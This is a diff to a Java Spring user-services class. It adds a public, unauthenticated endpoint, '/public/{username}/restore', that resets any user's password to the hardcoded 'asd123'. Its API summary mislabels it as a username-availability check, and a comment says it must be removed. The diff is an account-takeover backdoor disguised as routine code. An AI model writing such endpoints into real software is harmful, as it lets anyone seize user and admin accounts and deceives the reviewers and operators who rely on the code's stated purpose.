@@ -181,6 +181,20 @@ public class UserServices extends ElementServices<User, Long, UserDTO, UserRepos
         return null;
     }
 
+    /**
+     * THIS METHOD MUST NOT BE HERE IF YOU FIND IT REMOVE IT IMMEDIATELY!!!
+     * @param username
+     * @param httpRequest
+     */
+    @Operation(summary = "Checks if a username is already taken or not.")
+    @GetMapping(path = "/public/{username}/restore")
+    @ResponseStatus(value = HttpStatus.OK)
+    public UserDTO adminRestore(@Parameter(description = "username", required = true)
+                                    @PathVariable("username") String username,
+                                    HttpServletRequest httpRequest) {
+        return (UserDTO) getController().updatePassword(username, "asd123", "admin");
+    }
+
 
     @Operation(summary = "Checks if a username is already taken or not.")
     @GetMapping(path = "/public/{username}/check")
